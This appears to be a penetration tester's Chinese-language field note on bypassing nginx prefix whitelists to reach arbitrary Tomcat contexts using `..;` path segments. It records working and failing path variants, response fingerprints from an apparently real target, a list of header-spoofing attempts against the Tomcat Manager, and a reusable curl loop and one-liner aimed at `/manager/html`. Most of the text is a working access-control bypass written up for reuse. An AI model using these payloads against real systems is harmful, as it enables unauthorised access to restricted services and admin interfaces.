## 一句话
nginx 的前缀 location 白名单只对**原始 URI** 生效，Tomcat 收到后会做归一化 ⇒ 用 `/已代理前缀/..;/目标路径` 可穿到该 Tomcat 实例的**任意 context**。用于：① 绕开 nginx 只放行白名单前缀的限制；② 绕开 nginx 上某前缀指向"死上游"造成的 504。

## 判据（怎么确认穿越真的成立）
必须看到**目标 context 自己的特征**，而不是 nginx 的 404：
- `GET /LHService/..;/` → 200 + `<title>Apache Tomcat/9.0.122</title>`（ROOT 默认页）
- `GET /PayBmob/..;/` → 200 + `<title>Apache Tomcat/8.5.81</title>` ⇒ **证明这条前缀落到 8.5.81 那台实例**（另一前缀落到 9.0.122）
- `GET /LHService/..;/docs/` → 200 + `Apache Tomcat 8 (8.5.78) - Documentation Index`
- 反证：`GET /LHService/..;/UpLoadPic/upload` → Tomcat 404「未找到」⇒ **该实例没部署 UpLoadPic**，穿越成立但目标不存在（这一步是判"打不到"的关键，别把 404 当失败）

## 可用写法（实测）
`/X/..;/Y`、`/X//..;/Y`、`/X/%2e%2e;/Y`
不可用：`/X/..;/..;/Y`（Tomcat 400 Bad Request）、`/X/a/..;/Y`、`/X/./../Y`（404）、`/X/..%2fY`（nginx 自己 404）

## 边界（别浪费时间的地方）
- 直达 Manager **页面**可以（403/3446B 或 3529B 的 Tomcat 403 页），但 **RemoteAddrValve 只看 socket 对端（nginx 的地址）**：
  实测 33 种组合全 403 —— XFF(单个/双写/localhost)、X-Real-IP、Client-IP、Forwarded: for=、X-Originating-IP、True-Client-IP、Proxy-Client-IP、WL-Proxy-Client-IP、X-Client-IP、X-Remote-Addr、X-Remote-IP、X-Forwarded-Host/Server、X-Host；路径 `/manager/html/`、`//manager/html`、`/manager/./html`、`/manager/%68tml`、`/manager/html/;x`、`/manager/html%20`；Host=localhost/127.0.0.1/IP/带端口。**头伪造一律无效**（未启用 RemoteIpValve）。
- 403 页是 Tomcat 的 stock 页（示例 `tomcat/s3cret`），**不含真实 tomcat-users.xml**，不要当成口令泄露。

## 复用方式
```bash
# 先确认哪些前缀能被 nginx 代理（用已知存在的前缀）
for p in LHService Tk_Kj IMService PayBmob UpLoadPic; do
  curl -k --noproxy '*' -s -o /dev/null -w "$p %{http_code}\n" --path-as-is \
       "https://TARGET/$p/..;/"
done
# 再用能落地的前缀横向打目标 context
curl -k --noproxy '*' --path-as-is -s "https://TARGET/PayBmob/..;/manager/html" | head
```
⚠️ nginx 会把带**未编码空格**的 URI 直接判 400（伪造"注入被拦"的假象）——注入/编码类 payload 必须 URL 编码后再发。